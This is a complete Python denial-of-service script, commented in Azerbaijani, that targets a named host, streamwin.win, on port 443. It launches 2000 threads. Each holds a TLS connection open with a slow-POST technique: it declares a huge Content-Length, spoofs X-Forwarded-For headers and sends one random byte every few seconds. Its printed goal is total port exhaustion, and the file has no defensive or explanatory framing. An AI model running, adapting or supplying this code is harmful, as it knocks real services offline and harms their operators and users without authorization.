import socket
import ssl
import threading
import random
import time
import os

# --- TOTAL BLOCK CONFIG ---
TARGET_HOST = "streamwin.win"
TARGET_PORT = 443
# Railway Paid üçün bu rəqəmi sistem dözənə qədər artırırıq (1500-2000)
THREADS = 2000 

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def block_strike():
    # SSL Handshake-i ən yavaş və mürəkkəb metodlarla qururuq
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.options |= ssl.OP_NO_TLSv1_3 # TLS 1.3-ü bağlayırıq ki, 1.2-nin ağır handshake-ni istifadə etsin

    while True:
        try:
            # TCP bağlantısı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(10)

            # SSL bağlantısını yaradırıq
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # Serveri bazadan və RAM-dan "kilidləyən" ağır header
            # Content-Length hiləsi ilə bağlantını 'zombi' vəziyyətinə salırıq
            path = f"/?v={time.time()}&id={r_str(32)}&search={r_str(100)}"
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            header = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(1,6)}.0.0.0\r\n"
                f"X-Forwarded-For: {ip}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 9999999\r\n" # Server bu nəhəng datanı GÖZLƏYƏCƏK
                f"Connection: Keep-Alive\r\n"
                f"Keep-Alive: timeout=600, max=1000\r\n"
                f"\r\n"
            ).encode()

            conn.sendall(header)

            # --- SİRR BURADADIR (SLOW-WRITE) ---
            # Bağlantını bağlamırıq! Saniyədə cəmi 1 bayt göndəririk.
            # Server bu bağlantını açıq saxlayır və dolayısıyla portu kilitləyir.
            while True:
                try:
                    conn.send(os.urandom(1)) # "Canlı qaldığımızı" göstəririk
                    time.sleep(random.randint(2, 8)) # Gözləmə müddətini uzadırıq
                except:
                    break # Bağlantı kəsilsə yenidən başla

            conn.close()
        except:
            time.sleep(1) # IP blokuna düşməmək üçün çox qısa fasilə

def main():
    print(f"💀 ETERNAL DARKNESS INITIALIZED: {TARGET_HOST}")
    print("[!] Goal: Total Port Exhaustion and Connection Refusal.")
    
    # Bütün "zombi" döyüşçüləri işə salırıq
    for i in range(THREADS):
        t = threading.Thread(target=block_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Zombi bağlantı qapıya tıxandı...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
